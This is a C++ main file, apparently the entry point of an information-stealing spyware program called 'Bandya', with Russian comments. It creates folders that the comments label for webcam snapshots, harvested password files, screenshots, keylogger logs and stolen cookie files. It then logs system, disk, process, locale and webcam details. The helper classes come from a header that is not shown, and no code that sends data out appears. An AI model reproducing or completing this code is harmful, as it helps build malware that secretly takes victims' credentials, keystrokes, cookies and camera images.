#include "Bandya.hpp"

int main()
{
	setlocale(LC_ALL, "");

	ComputerInfo ComputerInfo;
	ResourcesInfo ResourcesInfo;
	DiskInfo DiskInfo;
	Running Running;
	СlassLocate СlassLocate;
	WebCamera WebCamera;
	
	CreateDirectory(Path);							// Папка в которой всё будет появлятся

	CreateDirectory(WebCamFloder);					// снимки с вебки
	CreateDirectory(PassFindFloder);				// txt файлы с паролями
	CreateDirectory(ScreenShotFloder);				// скриншоты
	CreateDirectory(KeyLoggerFloder);				// логи с kyLogger'а
	CreateDirectory(FindCookieFileFloder);			// найденные cookie файлы

	CreateDirectory(FloderInfo);					// папка с инфой о системе

	DiskInfo.WriteDiskInfo(				FloderInfo + LogName);
	ResourcesInfo.WriteResources(		FloderInfo + LogName);
	ComputerInfo.WriteComputerInfo(		FloderInfo + LogName);
	СlassLocate.WriteLocate(			FloderInfo + LogName);
	Running.RunInfo(					FloderInfo + LogName);

	WebCamera.WriteCameraInfo(			WebCamFloder + LogName);

	return 0;
}